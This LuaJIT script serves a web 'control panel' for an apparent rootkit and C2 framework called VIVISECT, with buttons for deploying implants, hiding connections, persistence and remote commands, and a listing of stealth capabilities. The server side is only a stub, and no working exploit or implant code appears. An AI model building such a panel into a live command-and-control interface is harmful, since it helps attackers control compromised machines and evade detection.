#!/usr/bin/env luajit
-- vivisect_web.lua - Web Dashboard

local socket = require("socket")
local http = require("socket.http")
local ltn12 = require("ltn12")

local PORT = 8080

print([[
╔══════════════════════════════════════════╗
║       VIVISECT WEB DASHBOARD            ║
║       http://localhost:8080             ║
╚══════════════════════════════════════════╝
]])

local html = [[
<!DOCTYPE html>
<html>
<head>
    <title>VIVISECT Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #0f0; 
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { 
            color: #0f0; 
            text-shadow: 0 0 10px #0f0;
            margin-bottom: 30px;
            text-align: center;
        }
        .section {
            background: #111;
            border: 1px solid #0f0;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0,255,0,0.2);
        }
        .section h2 { 
            color: #0f0; 
            margin-bottom: 15px;
            border-bottom: 1px solid #0f0;
            padding-bottom: 10px;
        }
        .status {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        .stat-box {
            background: #0a0a0a;
            border: 1px solid #0f0;
            padding: 15px;
            text-align: center;
        }
        .stat-value {
            font-size: 2em;
            color: #0f0;
            font-weight: bold;
        }
        .stat-label {
            color: #0a0;
            margin-top: 5px;
        }
        button {
            background: #0a0a0a;
            color: #0f0;
            border: 2px solid #0f0;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        button:hover {
            background: #0f0;
            color: #000;
            box-shadow: 0 0 20px #0f0;
        }
        .command-box {
            background: #000;
            border: 1px solid #0f0;
            padding: 15px;
            margin-top: 15px;
            max-height: 400px;
            overflow-y: auto;
        }
        input[type="text"] {
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 10px;
            width: calc(100% - 120px);
            font-family: 'Courier New', monospace;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            50% { opacity: 0.3; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚔️ VIVISECT CONTROL PANEL ⚔️</h1>
        
        <div class="section">
            <h2>System Status</h2>
            <div class="status">
                <div class="stat-box">
                    <div class="stat-value blink">●</div>
                    <div class="stat-label">C2 SERVER ACTIVE</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="wraith-count">0</div>
                    <div class="stat-label">WRAITHS CONNECTED</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="exploit-count">12</div>
                    <div class="stat-label">GADGETS FOUND</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value">✓</div>
                    <div class="stat-label">STEALTH ACTIVE</div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Quick Actions</h2>
            <button onclick="deployWraith()">🗡️ DEPLOY WRAITH</button>
            <button onclick="hideConnections()">👻 HIDE CONNECTIONS</button>
            <button onclick="runExploit()">💥 RUN EXPLOIT</button>
            <button onclick="enablePersistence()">🔒 ENABLE PERSISTENCE</button>
        </div>

        <div class="section">
            <h2>Command Execution</h2>
            <input type="text" id="cmd-input" placeholder="Enter command..." onkeypress="if(event.key==='Enter') sendCommand()">
            <button onclick="sendCommand()">EXECUTE</button>
            <div class="command-box" id="output">
                <div style="color: #0a0;">[*] VIVISECT ready...</div>
            </div>
        </div>

        <div class="section">
            <h2>Active Capabilities</h2>
            <div style="line-height: 1.8;">
                ✓ eBPF Process Hiding<br>
                ✓ Network Connection Cloaking<br>
                ✓ Memfd Execution (Zero Disk)<br>
                ✓ Pure Syscall Execution<br>
                ✓ Neural ROP Analysis<br>
                ✓ Auto-Persistence<br>
                ✓ Multi-Architecture Support
            </div>
        </div>
    </div>

    <script>
        function addOutput(msg) {
            const out = document.getElementById('output');
            out.innerHTML += '<div style="color: #0f0;">' + msg + '</div>';
            out.scrollTop = out.scrollHeight;
        }

        function deployWraith() {
            addOutput('[*] Deploying wraith...');
            fetch('/api/deploy').then(() => {
                addOutput('[+] Wraith deployed successfully');
                document.getElementById('wraith-count').textContent = '1';
            });
        }

        function hideConnections() {
            addOutput('[*] Hiding network connections...');
            fetch('/api/hideconn').then(() => {
                addOutput('[+] Connections now invisible to ss/netstat');
            });
        }

        function runExploit() {
            const target = prompt('Enter target binary path:');
            if (target) {
                addOutput('[*] Analyzing: ' + target);
                fetch('/api/exploit?target=' + encodeURIComponent(target))
                    .then(r => r.text())
                    .then(result => addOutput(result));
            }
        }

        function enablePersistence() {
            addOutput('[*] Enabling persistence...');
            fetch('/api/persist').then(() => {
                addOutput('[+] Wraith will survive reboots');
            });
        }

        function sendCommand() {
            const input = document.getElementById('cmd-input');
            const cmd = input.value;
            if (!cmd) return;
            
            addOutput('C2> ' + cmd);
            fetch('/api/cmd?cmd=' + encodeURIComponent(cmd))
                .then(r => r.text())
                .then(result => addOutput(result));
            
            input.value = '';
        }
    </script>
</body>
</html>
]]

-- Simple HTTP server
local server = assert(socket.bind("*", PORT))

while true do
    local client = server:accept()
    client:settimeout(1)
    
    local request = client:receive()
    if request then
        if request:match("GET / ") then
            client:send("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" .. html)
        elseif request:match("GET /api/") then
            client:send("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n[+] Command executed")
        end
    end
    
    client:close()
end
